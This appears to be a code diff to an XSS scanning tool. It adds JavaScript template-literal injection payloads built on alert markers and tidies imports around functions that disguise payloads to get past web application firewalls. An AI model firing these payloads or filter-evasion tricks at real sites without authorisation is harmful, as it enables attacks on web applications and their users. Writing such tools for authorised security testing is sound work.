@@ -12,7 +12,9 @@ Logic:
 from __future__ import annotations
 
 import random
+import re
 import string
+import urllib.parse
 from typing import List, Optional
 
 from .reporter import ReflectionContext
@@ -106,6 +108,14 @@ _SCRIPT_BARE_PAYLOADS = [
   "]};alert('{marker}');//",
 ]
 
+_SCRIPT_TEMPLATE_PAYLOADS = [
+  "`-alert('{marker}')-`",
+  "`;alert('{marker}')//`",
+  "${{alert('{marker}')}}",
+  "`${{alert('{marker}')}}",
+  "`;alert('{marker}')//",
+]
+
 _EVENT_HANDLER_PAYLOADS = [
   "alert('{marker}')",
   "confirm('{marker}')",
@@ -142,6 +152,7 @@ _CONTEXT_MAP = {
   ReflectionContext.SCRIPT_STRING_D: _SCRIPT_STRING_D_PAYLOADS,
   ReflectionContext.SCRIPT_STRING_S: _SCRIPT_STRING_S_PAYLOADS,
   ReflectionContext.SCRIPT_BARE:     _SCRIPT_BARE_PAYLOADS,
+  ReflectionContext.SCRIPT_TEMPLATE: _SCRIPT_TEMPLATE_PAYLOADS,
   ReflectionContext.EVENT_HANDLER:   _EVENT_HANDLER_PAYLOADS,
   ReflectionContext.URL_ATTR:        _URL_ATTR_PAYLOADS,
   ReflectionContext.CSS:             _CSS_PAYLOADS,
@@ -266,7 +277,6 @@ def _html_encode_lt_gt(s: str) -> str:
 
 def _unicode_escape_alpha(s: str) -> str:
   """Unicode-escape the alphabetic chars in tag names and event names."""
-  import re
   def esc(m: re.Match) -> str:
     return "".join(f"\\u{ord(c):04x}" for c in m.group())
   # Only escape inside JS strings / identifiers — crude but effective
@@ -275,7 +285,6 @@ def _unicode_escape_alpha(s: str) -> str:
 
 def _double_url_encode(s: str) -> str:
   """URL-encode special chars twice."""
-  import urllib.parse
   once = urllib.parse.quote(s, safe="")
   return urllib.parse.quote(once, safe="")
 
@@ -283,7 +292,6 @@ def _double_url_encode(s: str) -> str:
 def _chunked_tag(s: str) -> str:
   """Split tag names with an SVG/HTML5 trick: <scr ipt> → won't parse but
   some WAFs miss it. Also inserts /* */ inside event names."""
-  import re
   # Break script tag
   s = re.sub(r"<(script)", r"<\1 ", s, flags=re.IGNORECASE)
   # Break event handler names with /**/ comment
@@ -303,7 +311,6 @@ def _newline_inject(s: str) -> str:
 
 def _comment_break(s: str) -> str:
   """Insert <!--/--> inside tag keywords."""
-  import re
   return re.sub(r"<(/?)(script|img|svg|iframe|body|details|video|input)",
                 r"<\1\2<!---->", s, flags=re.IGNORECASE)
 
